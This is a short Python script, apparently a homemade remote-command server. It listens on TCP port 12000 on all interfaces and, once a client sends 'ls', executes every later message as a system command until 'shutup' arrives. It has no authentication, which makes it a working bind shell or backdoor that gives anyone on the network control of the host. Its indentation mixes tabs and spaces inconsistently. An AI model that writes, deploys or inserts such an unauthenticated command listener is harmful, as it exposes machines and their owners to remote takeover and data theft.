from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
from subprocess import call


HOST = ''
PORT = 12000
BUFSIZ = 1024
ADDR = (HOST, PORT)

SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)

def accept_incoming_connections():
    """Sets up handling for incoming clients."""
    while True:
        client, client_address = SERVER.accept()
        print("%s:%s has connected.\n" % client_address)
        Thread(target=handle_client, args=(client,)).start()

def handle_client(client):  # Takes client socket as argument.
	"""Handles a single client connection."""
	work_var = client.recv(BUFSIZ).decode("utf8")
	while (work_var!="ls"):
            work_var = client.recv(BUFSIZ).decode("utf8")
            
	while (work_var!="shutup"):
            list_work_var = work_var.split(" ")
            try:
                call(list_work_var)
            except:
                print("wrong command")

            work_var = client.recv(BUFSIZ).decode("utf8")

            
	
if __name__ == "__main__":
    SERVER.listen(5)
    print("Waiting for connection...\n\n")
    ACCEPT_THREAD = Thread(target=accept_incoming_connections)
    ACCEPT_THREAD.start()
    ACCEPT_THREAD.join()

SERVER.close()
